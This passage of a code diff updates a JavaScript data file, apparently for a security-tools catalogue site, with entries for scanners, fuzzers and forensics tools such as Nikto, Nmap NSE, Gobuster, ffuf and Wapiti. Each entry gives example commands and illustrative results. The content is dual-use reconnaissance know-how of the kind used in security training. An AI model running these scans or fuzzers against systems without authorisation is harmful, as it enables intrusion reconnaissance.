+      description: "Web server vulnerability scanner",
+      longDescription: "Nikto is an Open Source web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs.",
+      category: "Vulnerability Scanning",
+      difficulty: "Beginner",
+      lastUpdated: "2024-01-16",
+      officialSite: "https://cirt.net/Nikto2",
+      icon: "🌐",
+      whatItIs: "A web server vulnerability scanner that tests for dangerous files and configurations.",
+      whatItsUsedFor: "Used by security professionals to identify web server vulnerabilities, dangerous files, outdated software, and configuration issues.",
+      howItWorks: "Scans web servers by testing for thousands of known vulnerabilities, dangerous files, and configuration problems using comprehensive databases.",
+      commands: [
+        "nikto -h https://example.com",
+        "nikto -h https://example.com -p 80,443,8080",
+        "nikto -h https://example.com -o report.html",
+        "nikto -h target_list.txt"
+      ],
+      results: [
+        "Nikto v2.1.6 scan started",
+        "Found /admin/ directory (potentially sensitive)",
+        "Server leaks inodes via ETags",
+        "Scan completed: 15 items found"
+      ],
+      useCases: [
+        "Web application security testing",
+        "Server configuration auditing",
+        "Quick vulnerability assessment",
+        "Penetration testing"
+      ],
+      features: [
+        "6700+ vulnerability checks",
+        "Multiple output formats",
+        "Proxy support",
+        "SSL support",
+        "Plugin architecture"
+      ],
+      installSteps: [
+        "Install via package manager: sudo apt install nikto",
+        "Or clone from GitHub: git clone https://github.com/sullo/nikto.git",
+        "Update database: nikto -update",
+        "Test: nikto -Version"
+      ],
+      basicUsage: [
+        "Basic scan: nikto -h [URL]",
+        "Multiple ports: nikto -h [URL] -p [ports]",
+        "Save output: nikto -h [URL] -o [file]",
+        "SSL scan: nikto -h https://[target]"
+      ]
+    },
+    {
+      id: "nmap-scripts",
+      name: "Nmap NSE",
+      fullName: "Nmap Scripting Engine",
+      description: "Powerful scripting engine for advanced network discovery and vulnerability detection",
+      longDescription: "The Nmap Scripting Engine (NSE) allows users to write and share scripts that automate a wide variety of networking tasks. These scripts are executed in parallel with the speed and efficiency you expect from Nmap.",
+      category: "Vulnerability Scanning",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-14",
+      officialSite: "https://nmap.org/nsedoc/",
+      icon: "📜",
+      whatItIs: "An advanced scripting framework for Nmap that enables automated vulnerability detection and network analysis.",
+      whatItsUsedFor: "Used to extend Nmap's capabilities for vulnerability scanning, service enumeration, and advanced network reconnaissance.",
+      howItWorks: "Executes Lua scripts against network targets to perform specific tests, vulnerability checks, and information gathering tasks.",
+      commands: [
+        "nmap --script vuln target.com",
+        "nmap --script smb-vuln-* 192.168.1.0/24",
+        "nmap --script http-enum target.com",
+        "nmap --script ssl-cert,ssl-enum-ciphers target.com"
+      ],
+      results: [
+        "NSE: Loaded 149 scripts for scanning",
+        "Found CVE-2017-0144 (EternalBlue) vulnerability",
+        "Discovered hidden directories: /admin, /backup",
+        "SSL certificate expires in 30 days"
+      ],
+      useCases: [
+        "Vulnerability assessment",
+        "Service enumeration",
+        "SSL/TLS testing",
+        "Web application discovery"
+      ],
+      features: [
+        "600+ pre-built scripts",
+        "Custom script development",
+        "Parallel execution",
+        "Integration with Nmap",
+        "Community contributions"
+      ],
+      installSteps: [
+        "NSE comes with Nmap installation",
+        "Update scripts: nmap --script-updatedb",
+        "List scripts: nmap --script-help all",
+        "Test: nmap --script-help vuln"
+      ],
+      basicUsage: [
+        "Vulnerability scan: nmap --script vuln [target]",
+        "Service enum: nmap --script [category] [target]",
+        "Custom script: nmap --script [script_name] [target]",
+        "Script help: nmap --script-help [script]"
+      ]
+    },
+    {
+      id: "lynis",
+      name: "Lynis",
+      fullName: "Lynis Security Auditing Tool",
+      description: "Security auditing tool for Unix/Linux systems",
+      longDescription: "Lynis is a security auditing tool for systems based on UNIX like Linux, macOS, BSD, and others. It performs an in-depth security scan and runs on the system itself.",
+      category: "Vulnerability Scanning",
+      difficulty: "Beginner",
+      lastUpdated: "2024-01-13",
+      officialSite: "https://cisofy.com/lynis/",
+      icon: "🦁",
+      whatItIs: "A comprehensive security auditing tool for Unix-like systems.",
+      whatItsUsedFor: "Used by system administrators and security professionals to assess system security, identify misconfigurations, and improve security hardening.",
+      howItWorks: "Performs hundreds of individual tests to determine the security posture of a system, checking configurations, installed software, and security controls.",
+      commands: [
+        "lynis audit system",
+        "lynis show profiles",
+        "lynis show groups",
+        "lynis audit system --quick"
+      ],
+      results: [
+        "Lynis 3.0.8 security audit started",
+        "System hardening index: 72 (Good)",
+        "Found 3 warnings, 12 suggestions",
+        "Audit completed in 45 seconds"
+      ],
+      useCases: [
+        "System security auditing",
+        "Compliance checking",
+        "Security hardening",
+        "Configuration assessment"
+      ],
+      features: [
+        "300+ security tests",
+        "System hardening tips",
+        "Compliance frameworks",
+        "Detailed reporting",
+        "Multi-platform support"
+      ],
+      installSteps: [
+        "Download from official website",
+        "Extract: tar xfz lynis-3.x.x.tar.gz",
+        "Make executable: chmod +x lynis",
+        "Run: ./lynis audit system"
+      ],
+      basicUsage: [
+        "Full audit: lynis audit system",
+        "Quick scan: lynis audit system --quick",
+        "Show tests: lynis show tests",
+        "View report: cat /var/log/lynis.log"
+      ]
+    }
+  ],
+
+  "forensics": [
+    {
+      id: "volatility",
+      name: "Volatility",
+      fullName: "Volatility Memory Forensics Framework",
+      description: "Advanced memory forensics framework for incident response and malware analysis",
+      longDescription: "The Volatility Framework is a completely open collection of tools, implemented in Python under the GNU General Public License, for the extraction of digital artifacts from volatile memory (RAM) samples.",
+      category: "Forensics",
+      difficulty: "Advanced",
+      lastUpdated: "2024-01-19",
+      officialSite: "https://www.volatilityfoundation.org",
+      icon: "🧠",
+      whatItIs: "A comprehensive framework for analyzing volatile memory dumps from compromised systems.",
+      whatItsUsedFor: "Used by digital forensics investigators and incident responders to analyze memory dumps, detect malware, and reconstruct system activity.",
+      howItWorks: "Analyzes raw memory dumps to extract processes, network connections, registry data, and other system artifacts that exist only in volatile memory.",
+      commands: [
+        "volatility -f memory.dmp imageinfo",
+        "volatility -f memory.dmp --profile=Win7SP1x64 pslist",
+        "volatility -f memory.dmp --profile=Win7SP1x64 netscan",
+        "volatility -f memory.dmp --profile=Win7SP1x64 malfind"
+      ],
+      results: [
+        "Suggested Profile(s): Win7SP1x64, Win7SP0x64",
+        "Found 47 active processes",
+        "Detected 12 network connections",
+        "Malware injection detected in process 1337"
+      ],
+      useCases: [
+        "Malware analysis",
+        "Incident response",
+        "Digital forensics investigations",
+        "Memory analysis training"
+      ],
+      features: [
+        "Cross-platform memory analysis",
+        "Extensive plugin library",
+        "Malware detection capabilities",
+        "Timeline analysis",
+        "Custom plugin development"
+      ],
+      installSteps: [
+        "Install Python 2.7 (for Volatility 2) or Python 3 (for Volatility 3)",
+        "Clone repository: git clone https://github.com/volatilityfoundation/volatility.git",
+        "Install dependencies: pip install -r requirements.txt",
+        "Test: python vol.py --info"
+      ],
+      basicUsage: [
+        "Image info: volatility -f [dump] imageinfo",
+        "Process list: volatility -f [dump] --profile=[profile] pslist",
+        "Network scan: volatility -f [dump] --profile=[profile] netscan",
+        "Malware find: volatility -f [dump] --profile=[profile] malfind"
+      ]
+    },
+    {
+      id: "autopsy",
+      name: "Autopsy",
+      fullName: "Autopsy Digital Forensics Platform",
+      description: "Digital forensics platform with graphical interface",
+      longDescription: "Autopsy is a digital forensics platform and graphical interface to The Sleuth Kit and other digital forensics tools. It can be used by law enforcement, military, and corporate examiners to investigate what happened on a computer.",
+      category: "Forensics",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-17",
+      officialSite: "https://www.autopsy.com",
+      icon: "🔬",
+      whatItIs: "A comprehensive digital forensics platform with an intuitive graphical interface.",
+      whatItsUsedFor: "Used by digital forensics examiners to analyze hard drives, mobile devices, and network traffic in criminal investigations and incident response.",
+      howItWorks: "Provides a case management system and automated analysis modules to examine digital evidence, recover deleted files, and generate forensic reports.",
+      commands: [
+        "Launch Autopsy GUI application",
+        "Create new case",
+        "Add data source (disk image, device)",
+        "Run ingest modules and analysis"
+      ],
+      results: [
+        "Case created: Investigation_2024_001",
+        "Disk image processed: 500GB analyzed",
+        "Recovered 15,000 deleted files",
+        "Generated timeline of user activity"
+      ],
+      useCases: [
+        "Criminal investigations",
+        "Corporate incident response",
+        "Data recovery",
+        "Digital evidence analysis"
+      ],
+      features: [
+        "Graphical user interface",
+        "Case management system",
+        "Automated analysis modules",
+        "Timeline generation",
+        "Report generation"
+      ],
+      installSteps: [
+        "Download from official website",
+        "Install Java Runtime Environment",
+        "Run installer package",
+        "Launch Autopsy application"
+      ],
+      basicUsage: [
+        "Start Autopsy",
+        "Create new case",
+        "Add evidence source",
+        "Configure ingest modules"
+      ]
+    },
+    {
+      id: "wireshark",
+      name: "Wireshark",
+      fullName: "Wireshark Network Protocol Analyzer",
+      description: "Network protocol analyzer for troubleshooting and analysis",
+      longDescription: "Wireshark is the world's foremost and widely-used network protocol analyzer. It lets you see what's happening on your network at a microscopic level and is the de facto standard across many commercial and non-profit enterprises.",
+      category: "Forensics",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-21",
+      officialSite: "https://www.wireshark.org",
+      icon: "🦈",
+      whatItIs: "The world's most popular network protocol analyzer for detailed packet inspection.",
+      whatItsUsedFor: "Used by network administrators, security analysts, and forensics investigators to troubleshoot network issues, analyze traffic, and investigate security incidents.",
+      howItWorks: "Captures and analyzes network packets in real-time or from saved capture files, providing detailed protocol information and traffic analysis.",
+      commands: [
+        "wireshark",
+        "tshark -i eth0 -w capture.pcap",
+        "tshark -r capture.pcap -Y 'http.request'",
+        "dumpcap -i eth0 -w output.pcap"
+      ],
+      results: [
+        "Wireshark started successfully",
+        "Captured 10,000 packets in 5 minutes",
+        "Found 45 HTTP requests",
+        "Detected suspicious traffic patterns"
+      ],
+      useCases: [
+        "Network troubleshooting",
+        "Security analysis",
+        "Protocol development",
+        "Network forensics"
+      ],
+      features: [
+        "Live packet capture",
+        "Deep protocol inspection",
+        "Rich VoIP analysis",
+        "Powerful display filters",
+        "Cross-platform support"
+      ],
+      installSteps: [
+        "Download from official website",
+        "Install package: sudo apt install wireshark",
+        "Add user to wireshark group",
+        "Launch: wireshark"
+      ],
+      basicUsage: [
+        "Start capture: Select interface and click start",
+        "Apply filters: Use display filter bar",
+        "Save capture: File > Save As",
+        "Analyze protocols: Statistics menu"
+      ]
+    },
+    {
+      id: "sleuthkit",
+      name: "The Sleuth Kit",
+      fullName: "The Sleuth Kit Digital Investigation Tools",
+      description: "Collection of command line digital forensics tools",
+      longDescription: "The Sleuth Kit (TSK) is a library and collection of command line digital forensics tools that allows you to investigate volume and file system data.",
+      category: "Forensics",
+      difficulty: "Advanced",
+      lastUpdated: "2024-01-15",
+      officialSite: "https://www.sleuthkit.org",
+      icon: "🔍",
+      whatItIs: "A collection of powerful command-line tools for digital forensics investigations.",
+      whatItsUsedFor: "Used by forensics experts to analyze file systems, recover deleted files, and examine disk images at a low level.",
+      howItWorks: "Provides command-line tools to analyze file systems independently of the operating system, allowing examination of damaged or foreign file systems.",
+      commands: [
+        "mmls disk.img",
+        "fsstat -f ext3 disk.img",
+        "fls -r disk.img",
+        "icat disk.img 1234 > recovered_file.txt"
+      ],
+      results: [
+        "Partition table found: 3 partitions",
+        "File system: ext3, block size: 4096",
+        "Directory listing: 1,500 files found",
+        "File recovered successfully"
+      ],
+      useCases: [
+        "File system analysis",
+        "Deleted file recovery",
+        "Timeline creation",
+        "Low-level disk examination"
+      ],
+      features: [
+        "Multiple file system support",
+        "Timeline generation",
+        "Hash database lookup",
+        "Metadata analysis",
+        "Cross-platform compatibility"
+      ],
+      installSteps: [
+        "Install via package manager: sudo apt install sleuthkit",
+        "Or compile from source",
+        "Verify: mmls -V",
+        "Test with disk image"
+      ],
+      basicUsage: [
+        "List partitions: mmls [image]",
+        "File system info: fsstat [image]",
+        "List files: fls [image]",
+        "Extract file: icat [image] [inode]"
+      ]
+    },
+    {
+      id: "foremost",
+      name: "Foremost",
+      fullName: "Foremost File Carving Tool",
+      description: "File carving tool for recovering files based on headers and footers",
+      longDescription: "Foremost is a console program to recover files based on their headers, footers, and internal data structures. This process is commonly referred to as data carving.",
+      category: "Forensics",
+      difficulty: "Beginner",
+      lastUpdated: "2024-01-10",
+      officialSite: "http://foremost.sourceforge.net",
+      icon: "🗂️",
+      whatItIs: "A data carving tool that recovers files based on file signatures and data structures.",
+      whatItsUsedFor: "Used by forensics investigators to recover deleted files from disk images, USB drives, and other storage media.",
+      howItWorks: "Scans data for file signatures (headers and footers) to identify and extract files even when the file system is damaged or deleted.",
+      commands: [
+        "foremost -i disk.img -o output/",
+        "foremost -t jpeg,pdf -i evidence.dd -o recovered/",
+        "foremost -v -i /dev/sdb1 -o /tmp/recovery/",
+        "foremost -c custom.conf -i data.img -o results/"
+      ],
+      results: [
+        "Foremost version 1.5.7 started",
+        "Recovered 45 JPEG files",
+        "Recovered 12 PDF documents",
+        "Processing completed: 2.3GB scanned"
+      ],
+      useCases: [
+        "Deleted file recovery",
+        "Data carving from damaged media",
+        "Digital evidence recovery",
+        "Data loss investigation"
+      ],
+      features: [
+        "Multiple file type support",
+        "Custom configuration files",
+        "Bulk file recovery",
+        "Command-line interface",
+        "Fast scanning algorithms"
+      ],
+      installSteps: [
+        "Install via package manager: sudo apt install foremost",
+        "Or compile from source",
+        "Test installation: foremost -V",
+        "Check config: /etc/foremost.conf"
+      ],
+      basicUsage: [
+        "Basic recovery: foremost -i [input] -o [output]",
+        "Specific types: foremost -t [types] -i [input] -o [output]",
+        "Verbose mode: foremost -v -i [input] -o [output]",
+        "Custom config: foremost -c [config] -i [input] -o [output]"
+      ]
+    }
+  ],
+
+  "web-application-assessment": [
     {
       id: "owasp-zap",
       name: "OWASP ZAP",
       fullName: "OWASP Zed Attack Proxy",
-      description: "Free security tool for finding vulnerabilities in web applications",
-      longDescription: "OWASP ZAP is one of the world's most popular free security tools and is actively maintained by hundreds of international volunteers.",
-      category: "Web Assessment",
+      description: "Free security testing proxy for web applications",
+      longDescription: "OWASP ZAP is one of the world's most popular free security tools and is actively maintained by hundreds of international volunteers. It can help you automatically find security vulnerabilities in your web applications while developing and testing.",
+      category: "Web Application Assessment",
       difficulty: "Beginner",
-      lastUpdated: "2024-01-24",
+      lastUpdated: "2024-01-22",
       officialSite: "https://www.zaproxy.org",
       icon: "⚡",
-      whatItIs: "A free, open-source web application security scanner with both automated and manual testing capabilities.",
-      whatItsUsedFor: "Used for finding security vulnerabilities in web applications during development and testing phases.",
-      howItWorks: "Sits between the browser and web application to intercept and inspect messages, modify contents if needed, and then forward those packets on to the destination.",
+      whatItIs: "A comprehensive web application security scanner with an intuitive interface.",
+      whatItsUsedFor: "Used by developers and security testers to identify vulnerabilities in web applications during development and testing phases.",
+      howItWorks: "Acts as an intercepting proxy between the browser and web application, performing automated and manual security tests to identify vulnerabilities.",
       commands: [
-        "Launch ZAP GUI",
-        "Configure browser proxy",
-        "Spider/crawl target application",
-        "Run active security scan"
+        "zap.sh",
+        "Configure browser proxy to ZAP",
+        "Spider target application",
+        "Run active scan"
       ],
       results: [
-        "ZAP proxy started on port 8080",
-        "Application spidered: 150 URLs found",
-        "Active scan completed: 8 vulnerabilities",
-        "XSS vulnerability found in search form"
+        "ZAP started on port 8080",
+        "Spider completed: 150 URLs discovered",
+        "Active scan found 23 vulnerabilities",
+        "Report generated successfully"
       ],
       useCases: [
-        "Web application security testing",
-        "API testing",
-        "CI/CD pipeline integration",
-        "Security training"
+        "Web application penetration testing",
+        "DevSecOps integration",
+        "API security testing",
+        "Automated security scanning"
       ],
       features: [
-        "Automated scanners",
+        "Intercepting proxy",
+        "Automated scanner",
         "Manual testing tools",
-        "REST API",
-        "Plugin marketplace",
-        "Multiple scan types"
+        "API testing support",
+        "Extensive reporting"
       ],
       installSteps: [
         "Download from official website",
-        "Install Java 8+ if not present",
-        "Run installer package",
+        "Install Java Runtime Environment",
+        "Run installer or extract archive",
         "Launch ZAP application"
       ],
       basicUsage: [
-        "Launch ZAP",
-        "Configure manual proxy or automated scan",
-        "Enter target URL",
-        "Review scan results and vulnerabilities"
-      ]
-    },
-    {
-      id: "gobuster",
-      name: "Gobuster",
-      fullName: "Gobuster Directory/File Brute-Forcer",
-      description: "Fast directory/file brute-forcer written in Go",
-      longDescription: "Gobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains, and virtual host names on target web servers.",
-      category: "Web Assessment",
-      difficulty: "Beginner",
-      lastUpdated: "2024-01-22",
-      officialSite: "https://github.com/OJ/gobuster",
-      icon: "🚀",
-      whatItIs: "A fast and flexible brute-forcing tool for discovering hidden directories, files, and subdomains.",
-      whatItsUsedFor: "Used in web application testing to discover hidden directories, files, and subdomains that may contain sensitive information.",
-      howItWorks: "Uses wordlists to systematically test for the existence of directories, files, or subdomains by making HTTP requests and analyzing responses.",
-      commands: [
-        "gobuster dir -u http://example.com -w wordlist.txt",
-        "gobuster dns -d example.com -w subdomains.txt",
-        "gobuster vhost -u http://example.com -w vhosts.txt",
-        "gobuster dir -u http://example.com -w wordlist.txt -x php,html,txt"
-      ],
-      results: [
-        "Gobuster v3.4 started",
-        "Found directory: /admin (Status: 200)",
-        "Found file: /backup.zip (Status: 200)",
-        "Scan completed: 15 items discovered"
-      ],
-      useCases: [
-        "Directory enumeration",
-        "File discovery",
-        "Subdomain enumeration",
-        "Virtual host discovery"
-      ],
-      features: [
-        "Fast Go implementation",
-        "Multiple scan modes",
-        "Custom wordlist support",
-        "File extension specification",
-        "Status code filtering"
-      ],
-      installSteps: [
-        "Install Go: sudo apt install golang",
-        "Install Gobuster: go install github.com/OJ/gobuster/v3@latest",
-        "Or install from package: sudo apt install gobuster",
-        "Test: gobuster --help"
-      ],
-      basicUsage: [
-        "Directory scan: gobuster dir -u [URL] -w [wordlist]",
-        "DNS scan: gobuster dns -d [domain] -w [wordlist]",
-        "File extensions: gobuster dir -u [URL] -w [wordlist] -x [ext]",
-        "Custom threads: gobuster dir -u [URL] -w [wordlist] -t 50"
+        "Start ZAP application",
+        "Configure browser proxy",
+        "Browse target application",
+        "Run automated scans"
       ]
     },
     {
       id: "dirb",
       name: "DIRB",
       fullName: "DIRB Web Content Scanner",
-      description: "Web Content Scanner for finding existing and hidden directories",
-      longDescription: "DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server.",
-      category: "Web Assessment",
+      description: "Web content scanner for finding hidden directories and files",
+      longDescription: "DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.",
+      category: "Web Application Assessment",
       difficulty: "Beginner",
-      lastUpdated: "2024-01-20",
+      lastUpdated: "2024-01-14",
       officialSite: "http://dirb.sourceforge.net",
       icon: "📁",
-      whatItIs: "A web content scanner that discovers hidden directories and files on web servers using dictionary attacks.",
-      whatItsUsedFor: "Used to find hidden directories, files, and web content that may not be linked from the main website.",
-      howItWorks: "Performs dictionary-based attacks against web servers to discover existing web objects and hidden content.",
+      whatItIs: "A web content scanner that discovers hidden directories and files on web servers.",
+      whatItsUsedFor: "Used by penetration testers to discover hidden web content, backup files, and administrative interfaces that may contain vulnerabilities.",
+      howItWorks: "Performs dictionary-based attacks against web servers, testing for the existence of directories and files using wordlists.",
       commands: [
-        "dirb http://example.com",
-        "dirb http://example.com /usr/share/dirb/wordlists/common.txt",
-        "dirb http://example.com -X .php,.html,.txt",
-        "dirb http://example.com -o results.txt"
+        "dirb https://example.com",
+        "dirb https://example.com /usr/share/dirb/wordlists/common.txt",
+        "dirb https://example.com -o results.txt",
+        "dirb https://example.com -x extensions.txt"
       ],
       results: [
         "DIRB v2.22 scan started",
-        "Scanning URL: http://example.com/",
-        "Found directory: http://example.com/admin/",
-        "Found file: http://example.com/robots.txt"
+        "Found directory: /admin/",
+        "Found file: /backup.sql",
+        "Scan completed: 15 objects found"
       ],
       useCases: [
-        "Web directory enumeration",
-        "Hidden file discovery",
-        "Web content mapping",
-        "Security assessment"
+        "Hidden content discovery",
+        "Web application reconnaissance",
+        "Security assessments",
+        "Penetration testing"
       ],
       features: [
         "Dictionary-based scanning",
-        "Recursive directory scanning",
-        "File extension filtering",
-        "HTTP response analysis",
-        "Custom wordlist support"
+        "Custom wordlists",
+        "Extension testing",
+        "Recursive scanning",
+        "Session handling"
       ],
       installSteps: [
-        "Install: sudo apt install dirb",
-        "Check wordlists: ls /usr/share/dirb/wordlists/",
-        "Test scan: dirb http://example.com",
-        "View help: dirb"
+        "Install via package manager: sudo apt install dirb",
+        "Or compile from source",
+        "Test installation: dirb",
+        "Check wordlists: ls /usr/share/dirb/wordlists/"
       ],
       basicUsage: [
         "Basic scan: dirb [URL]",
         "Custom wordlist: dirb [URL] [wordlist]",
-        "File extensions: dirb [URL] -X [extensions]",
-        "Save output: dirb [URL] -o [file]"
+        "Save output: dirb [URL] -o [output]",
+        "File extensions: dirb [URL] -X [extensions]"
       ]
     },
     {
-      id: "wfuzz",
-      name: "Wfuzz",
-      fullName: "Wfuzz Web Application Fuzzer",
-      description: "Web application fuzzer for brute forcing web applications",
-      longDescription: "Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked directories, servlets, scripts, etc., bruteforce GET and POST parameters for checking different kinds of injections.",
-      category: "Web Assessment",
-      difficulty: "Intermediate",
-      lastUpdated: "2024-01-21",
-      officialSite: "https://github.com/xmendez/wfuzz",
-      icon: "🎯",
-      whatItIs: "A flexible web application fuzzer for discovering hidden resources and testing parameters.",
-      whatItsUsedFor: "Used for brute-forcing web applications to find hidden directories, parameters, and testing for various injection vulnerabilities.",
-      howItWorks: "Uses payloads and keywords to systematically test web applications for hidden content, parameters, and potential vulnerabilities.",
-      commands: [
-        "wfuzz -c -z file,wordlist.txt http://example.com/FUZZ",
-        "wfuzz -c -z file,params.txt http://example.com/page?FUZZ=test",
-        "wfuzz -c -z range,1-100 http://example.com/user?id=FUZZ",
-        "wfuzz -c --hc 404 -z file,wordlist.txt http://example.com/FUZZ"
-      ],
-      results: [
-        "Wfuzz 3.1.0 - The Web Fuzzer",
-        "Target: http://example.com/FUZZ",
-        "Found: admin (200 - 1337 Ch)",
-        "Found: backup (200 - 2048 Ch)"
-      ],
-      useCases: [
-        "Directory/file bruteforcing",
-        "Parameter discovery",
-        "Virtual host discovery",
-        "Injection testing"
-      ],
-      features: [
-        "Multiple payload types",
-        "Filter capabilities",
-        "Proxy support",
-        "Custom encoders",
-        "Response analysis"
-      ],
-      installSteps: [
-        "Install Python: sudo apt install python3-pip",
-        "Install Wfuzz: pip3 install wfuzz",
-        "Or from package: sudo apt install wfuzz",
-        "Test: wfuzz --help"
-      ],
-      basicUsage: [
-        "Directory fuzz: wfuzz -z file,[wordlist] [URL]/FUZZ",
-        "Parameter fuzz: wfuzz -z file,[wordlist] [URL]?param=FUZZ",
-        "Hide responses: wfuzz --hc 404 -z file,[wordlist] [URL]/FUZZ",
-        "POST data: wfuzz -z file,[wordlist] -d 'data=FUZZ' [URL]"
-      ]
-    },
-    {
-      id: "whatweb",
-      name: "WhatWeb",
-      fullName: "WhatWeb Website Fingerprinter",
-      description: "Web scanner for identifying technologies used by websites",
-      longDescription: "WhatWeb identifies websites. Its goal is to answer the question 'What is that Website?'. WhatWeb recognises web technologies including content management systems, blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.",
-      category: "Web Assessment",
+      id: "gobuster",
+      name: "Gobuster",
+      fullName: "Gobuster Directory/File Brute-forcer",
+      description: "Fast directory/file brute-forcer written in Go",
+      longDescription: "Gobuster is a tool used to brute-force URIs (directories and files) in web sites, DNS subdomains (with wildcard support), Virtual Host names on target web servers, Amazon S3 buckets.",
+      category: "Web Application Assessment",
       difficulty: "Beginner",
-      lastUpdated: "2024-01-18",
-      officialSite: "https://github.com/urbanadventurer/WhatWeb",
-      icon: "🕵️",
-      whatItIs: "A website fingerprinting tool that identifies technologies, frameworks, and components used by websites.",
-      whatItsUsedFor: "Used for reconnaissance to identify web technologies, CMS platforms, server software, and potential vulnerabilities.",
-      howItWorks: "Analyzes HTTP responses, HTML content, and other indicators to identify web technologies and create a fingerprint of the target website.",
+      lastUpdated: "2024-01-16",
+      officialSite: "https://github.com/OJ/gobuster",
+      icon: "🚀",
+      whatItIs: "A fast and efficient directory and file brute-forcing tool written in Go.",
+      whatItsUsedFor: "Used for discovering hidden web content, directories, files, and subdomains during web application security assessments.",
+      howItWorks: "Performs high-speed brute force attacks against web servers, DNS, and virtual hosts using customizable wordlists.",
       commands: [
-        "whatweb http://example.com",
-        "whatweb -v http://example.com",
-        "whatweb --aggression=3 http://example.com",
-        "whatweb -i urls.txt"
+        "gobuster dir -u https://example.com -w wordlist.txt",
+        "gobuster dns -d example.com -w subdomains.txt",
+        "gobuster vhost -u https://example.com -w vhosts.txt",
+        "gobuster s3 -w bucket_names.txt"
       ],
       results: [
-        "http://example.com [200 OK]",
-        "Apache[2.4.41], PHP[7.4.3], WordPress[5.9.3]",
-        "jQuery[3.6.0], Bootstrap[4.6.0]",
-        "SSL Certificate: Let's Encrypt"
+        "Gobuster v3.1.0 started",
+        "Found: /admin (Status: 200)",
+        "Found: /backup.zip (Status: 200)",
+        "Finished scanning 10,000 entries"
       ],
       useCases: [
-        "Technology stack identification",
-        "CMS detection",
-        "Server fingerprinting",
-        "Security reconnaissance"
+        "Directory enumeration",
+        "Subdomain discovery",
+        "Virtual host enumeration",
+        "S3 bucket discovery"
       ],
       features: [
-        "Technology identification",
-        "CMS detection",
-        "Plugin recognition",
-        "Bulk URL scanning",
-        "Aggression levels"
+        "High-speed scanning",
+        "Multiple scan modes",
+        "Custom status codes",
+        "Proxy support",
+        "Wildcard detection"
       ],
       installSteps: [
-        "Install Ruby: sudo apt install ruby",
-        "Install WhatWeb: sudo apt install whatweb",
-        "Or from source: git clone https://github.com/urbanadventurer/WhatWeb.git",
-        "Test: whatweb --help"
+        "Download from GitHub releases",
+        "Or install with Go: go install github.com/OJ/gobuster/v3@latest",
+        "Make executable: chmod +x gobuster",
+        "Test: gobuster version"
       ],
       basicUsage: [
-        "Basic scan: whatweb [URL]",
-        "Verbose mode: whatweb -v [URL]",
-        "Aggressive scan: whatweb --aggression=3 [URL]",
-        "Multiple URLs: whatweb -i [url_file]"
+        "Directory scan: gobuster dir -u [URL] -w [wordlist]",
+        "DNS scan: gobuster dns -d [domain] -w [wordlist]",
+        "Virtual host: gobuster vhost -u [URL] -w [wordlist]",
+        "S3 buckets: gobuster s3 -w [wordlist]"
+      ]
+    },
+    {
+      id: "ffuf",
+      name: "ffuf",
+      fullName: "Fuzz Faster U Fool",
+      description: "Fast web fuzzer written in Go",
+      longDescription: "ffuf is a fast web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing.",
+      category: "Web Application Assessment",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-12",
+      officialSite: "https://github.com/ffuf/ffuf",
+      icon: "💨",
+      whatItIs: "A fast and flexible web fuzzer for discovering hidden content and testing parameters.",
+      whatItsUsedFor: "Used for web application fuzzing including directory discovery, parameter testing, and virtual host enumeration.",
+      howItWorks: "Sends HTTP requests with different payloads to discover hidden content, test parameters, and identify potential vulnerabilities through fuzzing.",
+      commands: [
+        "ffuf -w wordlist.txt -u https://example.com/FUZZ",
+        "ffuf -w wordlist.txt -u https://example.com/ -H 'Host: FUZZ.example.com'",
+        "ffuf -w params.txt -u https://example.com/admin -d 'FUZZ=test'",
+        "ffuf -w extensions.txt -u https://example.com/indexFUZZ"
+      ],
+      results: [
+        "ffuf v1.5.0 started",
+        "200: /admin (Size: 1234)",
+        "403: /backup (Size: 567)",
+        "Completed: 15,000 requests"
+      ],
+      useCases: [
+        "Directory fuzzing",
+        "Parameter fuzzing",
+        "Virtual host discovery",
+        "File extension testing"
+      ],
+      features: [
+        "High performance fuzzing",
+        "Flexible matching/filtering",
+        "Multiple HTTP methods",
+        "Custom headers support",
+        "Output formatting options"
+      ],
+      installSteps: [
+        "Download from GitHub releases",
+        "Or install with Go: go install github.com/ffuf/ffuf@latest",
+        "Make executable: chmod +x ffuf",
+        "Test: ffuf -V"
+      ],
+      basicUsage: [
+        "Directory fuzz: ffuf -w [wordlist] -u [URL]/FUZZ",
+        "Vhost fuzz: ffuf -w [wordlist] -u [URL] -H 'Host: FUZZ.domain.com'",
+        "Parameter fuzz: ffuf -w [wordlist] -u [URL] -d 'FUZZ=value'",
+        "Extension fuzz: ffuf -w [wordlist] -u [URL]/fileFUZZ"
+      ]
+    },
+    {
+      id: "wapiti",
+      name: "Wapiti",
+      fullName: "Wapiti Web Application Vulnerability Scanner",
+      description: "Web application vulnerability scanner",
+      longDescription: "Wapiti allows you to audit the security of your websites or web applications. It performs 'black-box' scans (it does not study the source code) of the web application by crawling the webpages of the deployed webapp, looking for scripts and forms where it can inject data.",
+      category: "Web Application Assessment",
+      difficulty: "Intermediate",
+      lastUpdated: "2024-01-08",
+      officialSite: "http://wapiti.sourceforge.net",
+      icon: "🕷️",
+      whatItIs: "A black-box web application vulnerability scanner that crawls and tests web applications.",
+      whatItsUsedFor: "Used to identify vulnerabilities in web applications by performing automated security tests against forms, parameters, and cookies.",
+      howItWorks: "Crawls web applications to identify injection points, then performs various attacks to detect vulnerabilities like SQL injection, XSS, and file inclusion.",
+      commands: [
+        "wapiti -u https://example.com",
+        "wapiti -u https://example.com -f txt -o report.txt",
+        "wapiti -u https://example.com -m 'xss,sqli'",
+        "wapiti -u https://example.com --scope=domain"
+      ],
+      results: [
+        "Wapiti 3.1.3 scan started",
+        "Crawled 45 pages successfully",
+        "Found SQL injection in /search.php",
+        "Found XSS vulnerability in /contact.php"
+      ],
+      useCases: [
+        "Web application security testing",
+        "Vulnerability assessment",
+        "Penetration testing",
